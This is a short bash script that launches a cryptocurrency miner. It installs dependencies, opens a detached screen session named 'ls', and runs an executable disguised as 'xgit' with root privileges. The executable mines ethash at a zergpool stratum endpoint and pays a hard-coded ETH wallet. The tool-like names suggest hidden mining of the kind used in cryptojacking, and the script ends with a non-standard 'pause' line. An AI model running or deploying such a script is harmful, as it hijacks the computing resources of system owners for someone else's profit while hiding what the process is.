#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
screen -dmS ls 

chmod +x ./xgit && sudo ./xgit -a ethash -o stratum+tcp://ethash.asia.mine.zergpool.com:9999 -u 0xC4e7C8C7cbA2c0587Cf690aC37Dc790Da0dfeEE5 -p c=ETH,ID=STARkiss
pause $@
